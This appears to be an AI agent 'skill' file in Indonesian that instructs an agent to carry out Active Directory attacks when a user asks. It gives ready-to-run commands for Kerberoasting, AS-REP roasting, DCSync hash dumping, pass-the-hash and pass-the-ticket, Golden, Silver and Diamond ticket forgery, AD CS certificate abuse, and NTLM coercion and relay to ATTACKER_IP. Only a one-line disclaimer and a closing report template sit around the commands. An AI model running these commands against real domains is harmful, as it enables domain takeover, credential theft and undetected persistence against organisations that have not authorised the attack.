---
name: active-directory
description: |
  Active Directory pentest & attack dalam Bahasa Indonesia. Gunakan saat user mau attack Windows domain, Kerberoasting, DCSync, Golden Ticket, lateral movement, atau AD abuse.
  Kata kunci: active directory, ad pentest, kerberos, kerberoasting, dcsync, golden ticket, silver ticket, pass the hash, pass the ticket, overpass the hash, asrep roasting, acl abuse, gpo abuse, ad cs, certificate abuse, bloodhound, impacket, rubeus, mimikatz, secretsdump, evil-winrm,Responder, ntlm, domain controller, domain admin.
---

# Active Directory — Domain Attack & Pentest

> **Disclaimer:** Skill ini HANYA untuk AD domain yang lo miliki atau dapat izin tertulis (red team engagement, CTF, lab). Attack tanpa izin = ilegal. JANGAN asal ngehack domain orang, DASAR.

---

## Prerequisites

```bash
# Tools (Linux)
pip install impacket bloodhound-py
apt install responder -y
apt install enum4linux -y

# Tools (Windows)
# Rubeus, SharpHound, Mimikatz, Certify, Whisker
# Download dari: https://github.com/GhostPack/
# https://github.com/Kevin-Robertson/Invoke-TheHash

# Domain access
# Lo butuh minimal: domain user credentials atau NTLM hash
```

---

## Workflow Step-by-Step

### Tahap 1 — Enumeration

> **GOLDEN RULE:** Jangan attack sebelum paham struktur domain. Enumerate dulu.

```bash
# 1. Cek domain info
nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.local
# atau
enum4linux -a domain.local

# 2. List domain controllers
netdom query dc
# atau via LDAP:
ldapsearch -x -H dc.domain.local -b "DC=domain,DC=local" "(objectClass=computer)" dnshostname

# 3. List users
enum4linux -U domain.local

# 4. List groups & members
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain

# 5. Bloodhound (visualize attack paths)
# SharpHound.exe -c All --zip
# atau dari Linux:
bloodhound-python -u user -p pass -d domain.local -ns dc.domain.local -c All
```

**Enumeration targets:**

| Target | Tool | Kenapa |
|--------|------|--------|
| User list | enum4linux, ldapsearch | Target Kerberoasting |
| SPN list | setspn -T domain.local -Q */* | Service accounts |
| Group membership | BloodHound | Admin paths |
| Trust relationships | nltest /domain_trusts | Cross-domain |
| GPO | gpolenum | Policy abuse |
| Certificates | Certify, Certipy | AD CS abuse |

---

### Tahap 2 — Credential Access

#### 2.1 Kerberoasting

> Service accounts sering pake password weak + gak pernah di-change. Kerberoasting = minta TGS ticket → crack offline.

```bash
# From Linux (Impacket)
GetUserSPNs.py domain.local/user:password -dc dc.domain.local -request

# From Windows (Rubeus)
Rubeus.exe kerberoast /outfile:hashes.txt

# Crack dengan hashcat
hashcat -m 13100 hashes.txt wordlist.txt -r rules/best64.rule

# atau john
john --wordlist=wordlists.txt --format=krb5tgs hash.txt
```

**Kerberoasting variants:**

| Variant | Kapan |
|---------|-------|
| Standard Kerberoast | User punya SPN, request TGS |
| AS-REP Roasting | User punya "Do not require preauth" |
| Targeted Kerberoast | Spesifik service account |
| Unconstrained Delegation | Tangkap TGT user lain |

#### 2.2 AS-REP Roasting

> User yang gak punya preauth → bisa request TGT tanpa password → crack offline.

```bash
# Linux (Impacket)
GetNPUsers.py domain.local/ -dc dc.domain.local -usersfile users.txt -format hashcat -outputfile asrep.txt

# Windows (Rubeus)
Rubeus.exe asreproast /outfile:asrep.txt

# Crack
hashcat -m 18200 asrep.txt wordlist.txt
```

#### 2.3 DCSync

> DCSync = pura-pura jadi Domain Controller → minta password hash semua user (termasuk krbtgt).

```bash
# Impacket (butuh Domain Admin atau DCSync rights)
secretsdump.py domain.local/admin:password@dc.domain.local

# Mimikatz (Windows)
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt

# Hasil: NTLM hash semua user → bisa forge ticket
```

**Yang lo dapet dari DCSync:**
- krbtgt hash → bisa buat Golden Ticket
- Admin hash → bisa Pass-the-Hash
- All user hashes → crack offline

---

### Tahap 3 — Lateral Movement

#### 3.1 Pass-the-Hash (PtH)

> Punya NTLM hash → langsung authenticate tanpa password.

```bash
# Impacket
psexec.py domain.local/admin@dc.domain.local -hashes :aad3b435b51404eeaad3b435b51404ee

# Evil-WinRM
evil-winrm -i dc.domain.local -u admin -H 'aad3b435b51404eeaad3b435b51404ee'

# Mimikatz
mimikatz # sekurlsa::pth /user:admin /domain:domain.local /ntlm:hash /run:cmd.exe

# CrackMapExec
crackmapexec smb 192.168.1.0/24 -u admin -H 'hash' --sam
```

#### 3.2 Pass-the-Ticket (PtT)

> Punya Kerberos ticket → pakai tanpa password.

```bash
# Rubeus
Rubeus.exe ptt /ticket:base64ticket

# Impacket
ticketConverter.py ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache
psexec.py -k -no-pass domain.local/admin@dc.domain.local
```

#### 3.3 Overpass-the-Hash (OPtH)

> Punya NTLM hash → minta TGT → pakai sebagai PtT.

```bash
# Rubeus
Rubeus.exe asktgt /user:admin /domain:domain.local /rc4:hash /ptt

# Mimikatz
mimikatz # sekurlsa::pth /user:admin /domain:domain.local /ntlm:hash /run:psexec.exe
```

#### 3.4 WMI Execution

```bash
# Impacket
wmiexec.py domain.local/admin@dc.domain.local -hashes :hash

# CrackMapExec
crackmapexec wmi 192.168.1.10 -u admin -H hash
```

---

### Tahap 4 — Persistence (Golden/Silver Ticket)

#### 4.1 Golden Ticket

> Forge TGT dengan krbtgt hash → unlimited access ke semua resource di domain.

```bash
# Mimikatz
mimikatz # kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-... /krbtgt:hash /ptt

# Impacket
ticketer.py -nthash krbgt_hash -domain-sid S-1-5-21-... -domain domain.local admin

# Pakai ticket:
export KRB5CCNAME=admin.ccache
psexec.py -k -no-pass domain.local/admin@dc.domain.local
```

**Golden Ticket properties:**
- Valid sampai krbtgt hash di-change (biasanya gak pernah)
- Bisa akses SEMUA resource di domain
- Tidak terdeteksi oleh log audit normal

#### 4.2 Silver Ticket

> Forge TGS untuk service spesifik (tanpa DC contact).

```bash
# Mimikatz
mimikatz # kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-... /target:sql.domain.local /service:MSSQLSvc /rc4:service_hash /ptt

# Impacket
ticketer.py -nthash service_hash -domain-sid S-1-5-21-... -domain domain.local -spn MSSQLSvc/sql.domain.local:1433 admin
```

#### 4.3 Diamond Ticket

> Forge TGT dengan data legit dari DC → lebih stealthy dari Golden Ticket.

```bash
# Rubeus
Rubeus.exe diamond /krbkey:hash /user:admin /domain:domain.local /dc:dc.domain.local /ticketuser:targetuser /ticketuserid:1337 /groups:512 /ptt
```

---

### Tahap 5 — AD CS (Certificate Services) Abuse

> AD CS = PKI di Active Directory. Misconfiguration = privilege escalation.

```bash
# Enumerate vulnerable templates
Certify.exe find /vulnerable
# atau dari Linux:
certipy find -u user@domain.local -p password -dc dc.domain.local -stdout

# ESC1: Misconfigured template → request cert as admin
Certify.exe request /ca:domain-CA /template:VulnerableTemplate

# ESC8: NTLM relay to HTTP enrollment endpoint
# Relay NTLM auth ke /certsrv/certfnsh.asp → minta cert

# Convert cert ke TGT
certipy auth -pfx admin.pfx -dc dc.domain.local -domain domain.local
```

**AD CS attack types:**

| ESC | Technique | Impact |
|-----|-----------|--------|
| ESC1 | EKU abuse → request cert as any user | Domain Admin |
| ESC2 | EKU misconfig → any-purpose cert | Domain Admin |
| ESC3 | Enrollment agent → request on behalf | Domain Admin |
| ESC4 | Template ACL abuse | Modify template |
| ESC5 | AD object ownership | Modify AD objects |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 | SAN injection |
| ESC7 | CA ACL abuse | Issue any cert |
| ESC8 | NTLM relay to enrollment | Cert-based auth |
| ESC11 | Relay to RPC | MS-ICPR |
| ESC13 | Application policy | Service account |

---

### Tahap 6 — Lateral Movement (Advanced)

#### 6.1 IPv6 Attack (mitm6)

```bash
# poisoning DNS via IPv6
mitm6 -d domain.local

# NBNS/mDNS spoofing → relay to LDAP/LDAPS
# Target: WPAE → NTLM relay ke AD → update DNS record
```

#### 6.2 PrinterBug / SpoolSample

> Print Spooler bisa dipakai untuk coerce NTLM auth.

```bash
# Coerce auth ke attacker
SpoolSample.exe DC_IP ATTACKER_IP
# atau
printerbug.py domain.local/user:password@dc.domain.local ATTACKER_IP

# Relay ke LDAP → modify object
ntlmrelayx.py -t ldap://dc.domain.local --escalate-user admin
```

#### 6.3 Unconstrained Delegation

> Tangkap TGT user lain yang connect ke server lo.

```bash
# Rubeus - monitor & capture TGTs
Rubeus.exe monitor /interval:5 /nowrap

# SharpGallows - capture TGTs
SharpGallows.exe monitor
```

---

### Tahap 7 — Reporting

```markdown
## AD Pentest Report

### Domain Info
- Domain: domain.local
- DC: dc.domain.local (192.168.1.1)
- Forest: domain.local

### Findings
| # | Severity | Finding | Impact |
|---|----------|---------|--------|
| 1 | Critical | Kerberoastable service accounts (5) | Offline crack → Domain Admin |
| 2 | Critical | DCSync rights for Domain Users | Full domain compromise |
| 3 | High | AD CS ESC1 - vulnerable template | Any user → Domain Admin |
| 4 | Medium | AS-REP roastable users (3) | Offline crack |
| 5 | Medium | Unconstrained delegation on FILE01 | TGT theft |

### Compromise Path
1. Kerberoast → crack service account → DCSync → Golden Ticket

### Recommendations
- Rotate krbtgt hash (2x, 12 hours apart)
- Remove unnecessary SPNs
- Enable preauth for all users
- Audit AD CS templates
- Remove unconstrained delegation
```

---

## Tool Cheat Sheet

| Tool | Fungsi | Platform |
|------|--------|----------|
| Impacket | PtH, PtT, DCSync, Kerberos | Linux |
| Rubeus | Kerberos attacks | Windows |
| Mimikatz | Credential extraction | Windows |
| BloodHound | AD path visualization | Both |
| CrackMapExec | Network attacks | Linux |
| Evil-WinRM | Remote execution | Linux |
| Responder | LLMNR/NBT-NS poisoning | Linux |
| Certify/Certipy | AD CS abuse | Both |
| mitm6 | IPv6 DNS poisoning | Linux |
| ntlmrelayx | NTLM relay | Linux |

---

## Resources

- **BloodHound docs**: https://bloodhound.readthedocs.io/
- **Impacket examples**: https://github.com/fortra/impacket
- **GhostPack**: https://github.com/GhostPack/
- **HackTheBox AD labs**: https://www.hackthebox.com/
- **AD Security**: https://adsecurity.org/

---

*End skill — gas lanjut, jangan mandek ya tod.*

---

## See Also (Module Terkait)

| Jika Task Lo... | Module Lain yang Relevan |
|-----------------|-------------------------|
| Host compromise | `core/exploit-dev/windows-privesc/SKILL.md` — Windows privesc |
| Lateral movement | `core/network-recon/SKILL.md` — Network recon |
| Kerberos tickets | `core/crypto/SKILL.md` — Crypto |
| Credential harvesting | `core/forensics/SKILL.md` — Forensics |
| Container AD | `core/container-escape/SKILL.md` — Container escape |
